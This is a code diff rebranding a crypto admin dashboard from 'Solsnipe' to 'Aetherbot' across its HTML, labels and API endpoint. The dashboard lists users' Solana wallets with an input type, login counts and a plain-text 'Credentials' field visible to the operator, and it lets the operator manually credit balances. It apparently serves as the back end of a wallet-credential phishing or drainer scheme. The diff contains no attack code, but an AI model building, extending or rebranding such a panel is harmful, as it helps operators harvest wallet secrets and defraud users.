@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solsnipe Admin Dashboard</title>
+    <title>Aetherbot Admin Dashboard</title>
     <style>
         * {margin: 0; padding: 0; box-sizing: border-box;}
         body {
@@ -104,7 +104,7 @@
             <div class="header">
                 <div style="display: flex; justify-content: space-between; align-items: center;">
                     <div>
-                        <h1>🚀 Solsnipe Admin Dashboard</h1>
+                        <h1>🚀 Aetherbot Admin Dashboard</h1>
                         <p>Manage wallets, balances, and credits</p>
                     </div>
                     <button class="logout-btn" onclick="logout()">Logout</button>
@@ -125,7 +125,7 @@
                                 <th>Wallet Address</th>
                                 <th>Type</th>
                                 <th>SOL</th>
-                                <th>Solsnipe</th>
+                                <th>Aetherbot</th>
                                 <th>Logins</th>
                                 <th>Actions</th>
                             </tr>
@@ -169,7 +169,7 @@
     <div id="creditSnipeModal" class="modal">
         <div class="modal-content">
             <span class="modal-close" onclick="closeModal('creditSnipeModal')">&times;</span>
-            <h2 style="color: #667eea; margin-bottom: 20px;">⭐ Credit Solsnipe</h2>
+            <h2 style="color: #667eea; margin-bottom: 20px;">⭐ Credit Aetherbot</h2>
             <div id="creditSnipeAlert"></div>
             <form id="creditSnipeForm">
                 <div class="form-group">
@@ -180,7 +180,7 @@
                     <label>Amount (Credits)</label>
                     <input type="number" id="creditSnipeAmount" step="1" min="1" required>
                 </div>
-                <button type="submit" class="btn btn-success">Credit Solsnipe</button>
+                <button type="submit" class="btn btn-success">Credit Aetherbot</button>
             </form>
         </div>
     </div>
@@ -234,9 +234,9 @@
                 document.getElementById('statsGrid').innerHTML = `
                     <div class="stat-card"><h3>Wallets</h3><div class="value">${data.totals.totalWallets}</div></div>
                     <div class="stat-card"><h3>Total SOL</h3><div class="value">${data.totals.totalSolBalance.toFixed(4)}</div></div>
-                    <div class="stat-card"><h3>Total Solsnipe</h3><div class="value">${data.totals.totalSolsnipeBalance.toFixed(2)}</div></div>
+                    <div class="stat-card"><h3>Total Aetherbot</h3><div class="value">${data.totals.totalAetherbotBalance.toFixed(2)}</div></div>
                     <div class="stat-card"><h3>SOL Credited</h3><div class="value">${data.totals.totalSolCredited.toFixed(4)}</div></div>
-                    <div class="stat-card"><h3>Solsnipe Credited</h3><div class="value">${data.totals.totalSolsnipeCredited.toFixed(2)}</div></div>
+                    <div class="stat-card"><h3>Aetherbot Credited</h3><div class="value">${data.totals.totalAetherbotCredited.toFixed(2)}</div></div>
                 `;
                 displayWallets(wallets);
             } catch (e) {
@@ -254,7 +254,7 @@
                     <td class="wallet-address">${w.walletAddress.substring(0,8)}...${w.walletAddress.substring(w.walletAddress.length-6)}</td>
                     <td><span class="badge badge-info">${w.walletType}</span></td>
                     <td>${w.balance.toFixed(4)}</td>
-                    <td>${w.solsnipeBalance.toFixed(2)}</td>
+                    <td>${w.AetherbotBalance.toFixed(2)}</td>
                     <td>${w.loginCount}</td>
                     <td style="display:flex;gap:5px;">
                         <button class="btn-small btn-view" onclick='viewDetails(${JSON.stringify(w)})'>View</button>
@@ -271,9 +271,9 @@
                 <div class="detail-row"><span class="detail-label">Type:</span><span class="detail-value">${w.walletType}</span></div>
                 <div class="detail-row"><span class="detail-label">Input:</span><span class="detail-value">${w.inputType}</span></div>
                 <div class="detail-row"><span class="detail-label">SOL:</span><span class="detail-value">${w.balance.toFixed(4)}</span></div>
-                <div class="detail-row"><span class="detail-label">Solsnipe:</span><span class="detail-value">${w.solsnipeBalance.toFixed(2)}</span></div>
+                <div class="detail-row"><span class="detail-label">Aetherbot:</span><span class="detail-value">${w.AetherbotBalance.toFixed(2)}</span></div>
                 <div class="detail-row"><span class="detail-label">Total SOL Credited:</span><span class="detail-value">${w.totalSolCredited.toFixed(4)}</span></div>
-                <div class="detail-row"><span class="detail-label">Total Solsnipe Credited:</span><span class="detail-value">${w.totalSolsnipeCredited.toFixed(2)}</span></div>
+                <div class="detail-row"><span class="detail-label">Total Aetherbot Credited:</span><span class="detail-value">${w.totalAetherbotCredited.toFixed(2)}</span></div>
                 <div class="detail-row"><span class="detail-label">Logins:</span><span class="detail-value">${w.loginCount}</span></div>
                 <div class="detail-row"><span class="detail-label">Created:</span><span class="detail-value">${new Date(w.createdAt).toLocaleString()}</span></div>
                 ${w.credentials ? `<div style="margin-top:20px;"><strong>Credentials:</strong><div class="credentials-box">${w.credentials}</div></div>` : ''}
@@ -321,7 +321,7 @@
         document.getElementById('creditSnipeForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             try {
-                const res = await fetch(`${API}/credit-solsnipe`, {
+                const res = await fetch(`${API}/credit-Aetherbot`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json', 'Authorization': `Bearer ${token}`},
                     body: JSON.stringify({
